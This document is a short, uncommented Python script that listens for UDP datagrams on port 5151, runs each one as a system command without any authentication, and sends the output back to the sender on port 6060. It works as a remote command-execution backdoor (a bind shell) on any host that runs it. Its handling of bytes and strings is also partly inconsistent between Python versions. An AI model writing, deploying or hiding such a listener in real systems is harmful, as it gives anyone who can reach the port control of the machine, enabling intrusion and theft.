#!/usr/bin/python
import sys, socket, subprocess
try:
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.bind(('0.0.0.0', 5151))
	while True:
		command = sock.recvfrom(4096)
		#print(command)
		if not command:
			continue
		try:
			instruction = command[0].decode('utf-8')
			print(instruction)
			ipTuple = command[1]
			ip = ipTuple[0]
			#print(ip)
			output = subprocess.check_output(instruction.split())
			sock.sendto(str(output), (ip, 6060))
		except OSError:
			ipTuple = command[1]
			ip = ipTuple[0]
			sock.sendto(bytes('Not a recognised command', 'utf-8'), (ip, 6060))

except KeyboardInterrupt:
	print('KeyboardInterrupt')
